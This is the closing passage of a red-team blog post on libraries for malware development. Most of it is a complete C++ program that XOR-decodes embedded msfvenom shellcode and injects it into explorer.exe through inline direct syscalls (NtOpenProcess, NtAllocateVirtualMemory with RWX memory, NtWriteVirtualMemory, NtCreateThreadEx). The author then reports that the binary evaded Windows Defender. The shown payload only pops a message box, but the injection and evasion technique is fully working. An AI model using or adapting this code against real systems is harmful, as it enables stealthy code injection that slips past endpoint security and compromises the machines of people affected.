	<span class="n">ULONG</span>           <span class="n">Attributes</span><span class="p">;</span>
	<span class="n">PVOID</span>           <span class="n">SecurityDescriptor</span><span class="p">;</span>
	<span class="n">PVOID</span>           <span class="n">SecurityQualityOfService</span><span class="p">;</span>
<span class="p">}</span> <span class="n">OBJECT_ATTRIBUTES</span><span class="p">,</span> <span class="o">*</span> <span class="n">POBJECT_ATTRIBUTES</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_CLIENT_ID</span>
<span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span> <span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_PS_ATTRIBUTE</span>
<span class="p">{</span>
	<span class="n">ULONG</span>  <span class="n">Attribute</span><span class="p">;</span>
	<span class="n">SIZE_T</span> <span class="n">Size</span><span class="p">;</span>
	<span class="k">union</span>
	<span class="p">{</span>
		<span class="n">ULONG</span> <span class="n">Value</span><span class="p">;</span>
		<span class="n">PVOID</span> <span class="n">ValuePtr</span><span class="p">;</span>
	<span class="p">}</span> <span class="n">u1</span><span class="p">;</span>
	<span class="n">PSIZE_T</span> <span class="n">ReturnLength</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PS_ATTRIBUTE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPS_ATTRIBUTE</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_PS_ATTRIBUTE_LIST</span>
<span class="p">{</span>
	<span class="n">SIZE_T</span>       <span class="n">TotalLength</span><span class="p">;</span>
	<span class="n">PS_ATTRIBUTE</span> <span class="n">Attributes</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">PS_ATTRIBUTE_LIST</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPS_ATTRIBUTE_LIST</span><span class="p">;</span>

<span class="n">NTSTATUS</span> <span class="n">NtOpenProcess</span><span class="p">(</span><span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">POBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span> <span class="n">OPTIONAL</span><span class="p">);</span>

<span class="n">NTSTATUS</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ZeroBits</span><span class="p">,</span> <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Protect</span><span class="p">);</span>

<span class="n">NTSTATUS</span> <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">NumberOfBytesToWrite</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PSIZE_T</span> <span class="n">NumberOfBytesWritten</span> <span class="n">OPTIONAL</span><span class="p">);</span>

<span class="n">NTSTATUS</span> <span class="n">NtCreateThreadEx</span><span class="p">(</span><span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">POBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span> <span class="n">OPTIONAL</span><span class="p">,</span> <span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartRoutine</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span> <span class="n">Argument</span> <span class="n">OPTIONAL</span><span class="p">,</span> <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">CreateFlags</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">ZeroBits</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackSize</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">MaximumStackSize</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PPS_ATTRIBUTE_LIST</span> <span class="n">AttributeList</span> <span class="n">OPTIONAL</span><span class="p">);</span>

<span class="n">NTSTATUS</span> <span class="n">NtClose</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">Handle</span><span class="p">);</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="n">jm</span><span class="o">::</span><span class="n">init_syscalls_list</span><span class="p">();</span>

	<span class="c1">// PID of explorer.exe</span>
	<span class="n">DWORD</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">4396</span><span class="p">;</span>

	<span class="c1">// msfvenom --payload windows/x64/messagebox TEXT="Hello there." EXITFUNC=thread -f c</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x9c\x28\xe1\x84\x90\x9f\x9f\x9f\x88\xb0\x60\x60\x60\x21\x31\x21\x30\x32\x31\x36\x28\x51\xb2\x05\x28\xeb\x32\x00\x5e\x28\xeb\x32\x78\x5e\x28\xeb\x32\x40\x5e\x28\xeb\x12\x30\x5e\x28\x6f\xd7\x2a\x2a\x2d\x51\xa9\x28\x51\xa0\xcc\x5c\x01\x1c\x62\x4c\x40\x21\xa1\xa9\x6d\x21\x61\xa1\x82\x8d\x32\x21\x31\x5e\x28\xeb\x32\x40\x5e\xeb\x22\x5c\x28\x61\xb0\x5e\xeb\xe0\xe8\x60\x60\x60\x28\xe5\xa0\x14\x0f\x28\x61\xb0\x30\x5e\xeb\x28\x78\x5e\x24\xeb\x20\x40\x29\x61\xb0\x83\x3c\x28\x9f\xa9\x5e\x21\xeb\x54\xe8\x28\x61\xb6\x2d\x51\xa9\x28\x51\xa0\xcc\x21\xa1\xa9\x6d\x21\x61\xa1\x58\x80\x15\x91\x5e\x2c\x63\x2c\x44\x68\x25\x59\xb1\x15\xb6\x38\x5e\x24\xeb\x20\x44\x29\x61\xb0\x06\x5e\x21\xeb\x6c\x28\x5e\x24\xeb\x20\x7c\x29\x61\xb0\x5e\x21\xeb\x64\xe8\x28\x61\xb0\x21\x38\x21\x38\x3e\x39\x3a\x21\x38\x21\x39\x21\x3a\x28\xe3\x8c\x40\x21\x32\x9f\x80\x38\x21\x39\x3a\x5e\x28\xeb\x72\x89\x29\x9f\x9f\x9f\x3d\x29\xa7\xa1\x60\x60\x60\x60\x5e\x28\xed\xf5\x7a\x61\x60\x60\x5e\x2c\xed\xe5\x47\x61\x60\x60\x28\x51\xa9\x21\xda\x25\xe3\x36\x67\x9f\xb5\xdb\x80\x7d\x4a\x6a\x21\xda\xc6\xf5\xdd\xfd\x9f\xb5\x28\xe3\xa4\x48\x5c\x66\x1c\x6a\xe0\x9b\x80\x15\x65\xdb\x27\x73\x12\x0f\x0a\x60\x39\x21\xe9\xba\x9f\xb5\x28\x05\x0c\x0c\x0f\x40\x14\x08\x05\x12\x05\x4e\x60\x2d\x05\x13\x13\x01\x07\x05\x22\x0f\x18\x60</span><span class="s">"</span><span class="p">;</span>
	<span class="n">SIZE_T</span> <span class="n">shellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

	<span class="c1">// XOR-decrypt the shellcode</span>
	<span class="kt">char</span> <span class="n">key</span> <span class="o">=</span> <span class="sc">'`'</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">;</span>
	<span class="n">OBJECT_ATTRIBUTES</span> <span class="n">objectAttributes</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">objectAttributes</span><span class="p">)</span> <span class="p">};</span>
	<span class="n">CLIENT_ID</span> <span class="n">clientId</span> <span class="o">=</span> <span class="p">{</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtOpenProcess</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">objectAttributes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clientId</span><span class="p">);</span>

	<span class="n">LPVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">baseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcodeSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtWriteVirtualMemory</span><span class="p">)(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtCreateThreadEx</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GENERIC_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtClose</span><span class="p">)(</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="n">INLINE_SYSCALL</span><span class="p">(</span><span class="n">NtClose</span><span class="p">)(</span><span class="n">hThread</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div><blockquote><p><em><strong>NOTE:</strong> Make sure to create the necessary structs and typedefs as this tool won’t do it for you, unlike <a href="https://github.com/jthuraisamy/SysWhispers2">jthuraisamy/SysWhispers2</a>.</em></p></blockquote><blockquote><p><em><strong>TIP:</strong> Use <a href="https://github.com/jthuraisamy/SysWhispers2">jthuraisamy/SysWhispers2</a> to generate the required structs and typedefs, then utilize <a href="https://github.com/JustasMasiulis/inline_syscall">JustasMasiulis/inline_syscall</a> when using syscalls.</em></p></blockquote><p>If we run the compiled binary against Windows Defender, it was not detected (at the time of writing) compared to the binary generated with <a href="https://github.com/jthuraisamy/SysWhispers2">jthuraisamy/SysWhispers2</a>.</p><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-not-detected.png" class="lightbox-image" title="inline-syscall-not-detected"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-not-detected.png" alt="inline_syscall not Detected by Win Defender"></a></p><h2 id="conclusion">Conclusion</h2><p>That’s it for now! I know I may have missed some libraries, so if you know some easy to use libraries for malware development, feel free to let me know and I can add them here.</p><p>Huge thanks to all the people who are dedicating their time writing and open-sourcing tools, as well as those who keep sharing their knowledge and research. And if you can, <strong>please support and sponsor their work</strong>.</p></div><div class="share-page"> <span style="float: left;">Share this on →&nbsp;&nbsp;</span> <div id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" title="X Post Button" src="https://platform.twitter.com/widgets/tweet_button.2f70fb173b9000da126c79afe2098f02.en.html#dnt=false&amp;id=twitter-widget-0&amp;lang=en&amp;original_referer=https%3A%2F%2Fcaptmeelo.com%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&amp;size=m&amp;text=Useful%20Libraries%20for%20Malware%20Development%20-%20Hack.Learn.Share&amp;time=1771412262226&amp;type=share&amp;url=https%3A%2F%2Fcapt-meelo.github.io%2F%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&amp;via=CaptMeelo" style="position: static; visibility: visible; width: 65px; height: 20px;" data-original-tag="iframe">
  
  <link rel="dns-prefetch" href="https://twitter.com/">
  <title>Post Button</title>
  <base target="_blank">
  






</div> <div class="fb-share-button fb_iframe_widget" data-href="https://capt-meelo.github.io//redteam/maldev/2022/02/16/libraries-for-maldev.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;" fb-xfbml-state="rendered" fb-iframe-plugin-query="app_id=&amp;container_width=1888&amp;href=https%3A%2F%2Fcapt-meelo.github.io%2F%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey"><span style="vertical-align: bottom; width: 77px; height: 20px;"><div name="ffb6eaeb4d7d59945" width="1000px" height="1000px" data-testid="fb:share_button Facebook Social Plugin" title="fb:share_button Facebook Social Plugin" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" src="https://www.facebook.com/v2.6/plugins/share_button.php?app_id=&amp;channel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfee492a00cdc16d6f%26domain%3Dcaptmeelo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fcaptmeelo.com%252Ffe1f3e001a8d108ae%26relation%3Dparent.parent&amp;container_width=1888&amp;href=https%3A%2F%2Fcapt-meelo.github.io%2F%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey" style="border: none; visibility: visible; width: 77px; height: 20px;" class="" data-original-tag="iframe"><title>Facebook</title><div class="_li"><div class="pluginSkinLight pluginFontHelvetica"><div><div class="inlineBlock" id="u_0_0_zq"><a class="_2vmz" href="https://www.facebook.com/sharer/sharer.php?kid_directed_site=0&amp;sdk=joey&amp;u=https%3A%2F%2Fcapt-meelo.github.io%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&amp;display=popup&amp;ref=plugin&amp;src=share_button" target="_blank" id="u_0_1_Am"><div><button id="icon-button" type="submit" class="inlineBlock _2tga _89n_ _8j9v"><span class="_8f1i"></span><div class=""><span class="_3jn- inlineBlock _2v7"><span class="_3jn_"></span><span class="_49vg _8a19"><img class="img" style="vertical-align:middle" src="https://static.xx.fbcdn.net/rsrc.php/v4/yn/r/GzgedhmzSQa.png" alt="" width="12" height="12"></span></span><span class="_49vh _2pi7">Share</span><span class="_5n6h _2pih" id="u_0_2_zA">6</span></div></button></div></a></div></div></div></div></div></span></div></div><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div></div><div class="panel-body"><h4>Related Posts</h4><ul><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2022/11/07/cloning-signing.html">Lessons Learned from Cloning Windows Binaries and Code Signing Implants</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2022/10/17/independent-malware.html">Writing an Independent Malware</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2022/05/10/ntcreateuserprocess.html">Making NtCreateUserProcess Work</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2022/04/21/kernelcallbacktable-injection.html">Adventures with KernelCallbackTable Injection</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2021/12/15/lazy-maldev.html">Quick &amp; Lazy Malware Development</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li><li class="relatedPost"> <a href="https://capt-meelo.github.io//redteam/maldev/2021/11/22/picky-ppid-spoofing.html">Picky PPID Spoofing</a> (Categories: <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a>)</li></ul></div><div class="PageNavigation"> <a class="prev" href="https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html">« Quick &amp; Lazy Malware Development</a> <a class="next" href="https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html">Adventures with KernelCallbackTable Injection »</a></div><div class="disqus-comments"><div id="disqus_thread"></div></div></div></div>      <link rel="stylesheet" href="https://captmeelo.com/static/css/lightbox.css">
<div scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.2f70fb173b9000da126c79afe2098f02.html?origin=https%3A%2F%2Fcaptmeelo.com" title="Twitter settings iframe" style="display: none;" data-original-tag="iframe">
<title>Twitter Widget Iframe</title>



</div><div id="lightbox"></div><div id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" title="Twitter analytics iframe" data-original-tag="iframe"></div></body></html>